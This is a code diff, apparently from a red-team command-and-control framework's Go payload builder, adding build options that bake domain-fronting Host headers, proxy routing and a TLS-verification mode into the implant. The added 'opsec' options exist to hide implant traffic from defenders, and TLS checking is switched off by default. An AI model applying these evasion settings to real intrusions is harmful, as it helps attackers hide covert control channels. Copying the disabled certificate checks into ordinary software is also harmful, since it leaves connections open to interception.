@@ -96,6 +96,27 @@ var payloadDefinition = agentstructs.PayloadType{
 			DefaultValue:  "",
 			ParameterType: agentstructs.BUILD_PARAMETER_TYPE_STRING,
 		},
+		{
+			Name:          "host_header",
+			Description:   "Optional: Override the Host header in HTTP requests. Used for domain fronting — set this to the real C2 domain while callback_host points to the CDN edge.",
+			Required:      false,
+			DefaultValue:  "",
+			ParameterType: agentstructs.BUILD_PARAMETER_TYPE_STRING,
+		},
+		{
+			Name:          "proxy_url",
+			Description:   "Optional: Route agent traffic through an HTTP/SOCKS proxy (e.g. http://proxy:8080 or socks5://127.0.0.1:1080).",
+			Required:      false,
+			DefaultValue:  "",
+			ParameterType: agentstructs.BUILD_PARAMETER_TYPE_STRING,
+		},
+		{
+			Name:          "tls_verify",
+			Description:   "TLS certificate verification mode. 'none' = skip verification (default). 'system-ca' = use OS trust store. 'pinned:<sha256hex>' = pin to specific certificate fingerprint (e.g. pinned:a1b2c3...).",
+			Required:      false,
+			DefaultValue:  "none",
+			ParameterType: agentstructs.BUILD_PARAMETER_TYPE_STRING,
+		},
 	},
 	BuildSteps: []agentstructs.BuildStep{
 		{
@@ -210,6 +231,18 @@ func build(payloadBuildMsg agentstructs.PayloadBuildMessage) agentstructs.Payloa
 			ldflags += fmt.Sprintf(" -X '%s.postURI=%s'", fawkes_main_package, val)
 		}
 	}
+
+	// Opsec build parameters: domain fronting, proxy, TLS verification
+	if hostHeader, err := payloadBuildMsg.BuildParameters.GetStringArg("host_header"); err == nil && hostHeader != "" {
+		ldflags += fmt.Sprintf(" -X '%s.hostHeader=%s'", fawkes_main_package, hostHeader)
+	}
+	if proxyURL, err := payloadBuildMsg.BuildParameters.GetStringArg("proxy_url"); err == nil && proxyURL != "" {
+		ldflags += fmt.Sprintf(" -X '%s.proxyURL=%s'", fawkes_main_package, proxyURL)
+	}
+	if tlsVerify, err := payloadBuildMsg.BuildParameters.GetStringArg("tls_verify"); err == nil && tlsVerify != "" {
+		ldflags += fmt.Sprintf(" -X '%s.tlsVerify=%s'", fawkes_main_package, tlsVerify)
+	}
+
 	architecture, err := payloadBuildMsg.BuildParameters.GetStringArg("architecture")
 	if err != nil {
 		payloadBuildResponse.Success = false
